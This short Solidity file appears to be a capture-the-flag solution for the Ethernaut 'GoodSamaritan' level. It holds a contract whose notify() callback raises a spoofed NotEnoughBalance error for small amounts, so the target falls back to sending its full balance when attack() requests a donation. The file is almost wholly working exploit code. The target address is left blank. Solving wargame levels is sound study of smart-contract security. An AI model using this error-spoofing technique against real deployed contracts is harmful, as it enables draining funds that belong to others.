// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "../LevelsContracts/#28 GoodSamaritan.sol" ;

contract GoodSamaritanHack {

    error NotEnoughBalance();

    GoodSamaritan goodsamaritan  = GoodSamaritan(/*adress */); 

    function attack() external {
        goodsamaritan.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
